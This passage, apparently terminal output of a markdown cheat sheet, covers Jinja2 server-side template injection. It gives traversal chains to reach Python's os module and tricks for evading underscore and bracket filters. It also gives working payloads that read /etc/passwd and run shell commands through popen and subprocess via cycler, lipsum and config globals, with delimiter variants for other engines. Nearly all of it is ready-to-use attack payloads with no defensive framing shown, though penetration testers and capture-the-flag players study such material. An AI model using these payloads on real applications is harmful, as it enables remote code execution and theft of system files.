[34m│[0m - config.__class__.__init__.__globals__['os']                                [34m│[0m
[34m│[0m - request.application.__self__._get_data_for_json.__globals__['os']          [34m│[0m
[34m│[0m - lipsum.__globals__['os']                                                   [34m│[0m
[34m│[0m - cycler.__init__.__globals__['os']                                          [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Jinja2/Python Object Traversal                                           [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ''.__class__                  → ''|attr('__class__')                         [34m│[0m
[34m│[0m                               → ''|attr('\x5f\x5fclass\x5f\x5f')             [34m│[0m
[34m│[0m                               → ''|attr(request.args.x) with ?x=__class__    [34m│[0m
[34m│[0m                               → getattr('','__class__')                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Blocked Underscores Bypass                                               [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m __class__                     → \x5f\x5fclass\x5f\x5f (hex escape)           [34m│[0m
[34m│[0m                               → request.args.c with ?c=__class__             [34m│[0m
[34m│[0m                               → attr filter with crafted string              [34m│[0m
[34m│[0m                               → |join                                        [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Blocked Brackets Bypass                                                  [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m config['SECRET']              → config|attr('SECRET')                        [34m│[0m
[34m│[0m                               → config.SECRET (dot notation)                 [34m│[0m
[34m│[0m                               → getattr(config,'SECRET')                     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Alternative Entry Points (not just '')                                   [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m - cycler, joiner, namespace (Jinja2 built-ins)                               [34m│[0m
[34m│[0m - lipsum.__globals__                                                         [34m│[0m
[34m│[0m - range.__init__.__globals__                                                 [34m│[0m
[34m│[0m - request.application.__globals__                                            [34m│[0m
[34m│[0m - config.__class__.__init__.__globals__                                      [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Common Jinja2 SSTI Payloads                                              [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Read file:**                                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}     [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Execute command:**                                                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ ''.__class__.__mro__[2].__subclasses__()[X]('id', shell=True,             [34m│[0m
[34m│[0m stdout=-1).communicate() }}                                                  [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Where X is the index of subprocess.Popen in __subclasses__()                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using cycler:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ cycler.__init__.__globals__.os.popen('id').read() }}                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using lipsum:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ lipsum.__globals__['os'].popen('id').read() }}                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **Using config:**                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Template Delimiter Variations                                            [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Jinja2: {{ }}, {% %}, {# #}                                                  [34m│[0m
[34m│[0m Twig: {{ }}, {% %}                                                           [34m│[0m
[34m│[0m Smarty: { }, {literal}                                                       [34m│[0m
[34m│[0m Freemarker: ${}, <#>                                                         [34m│[0m
[34m│[0m Velocity: $, #                                                               [34m│[0m
[34m│[0m Mako: ${}, <%, %>                                                            [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Building Blocks Approach                                                 [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m SSTI BUILDING BLOCKS:                                                        [34m│[0m
[34m│[0m 1. Template delimiter: {{ }}, ${ }, <% %>                                    [34m│[0m
[34m│[0m 2. Object access: literals, globals, built-ins                               [34m│[0m
[34m│[0m 3. Traversal: __class__, __mro__, __subclasses__                             [34m│[0m
[34m│[0m 4. Execution: popen(), system(), eval()                                      [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
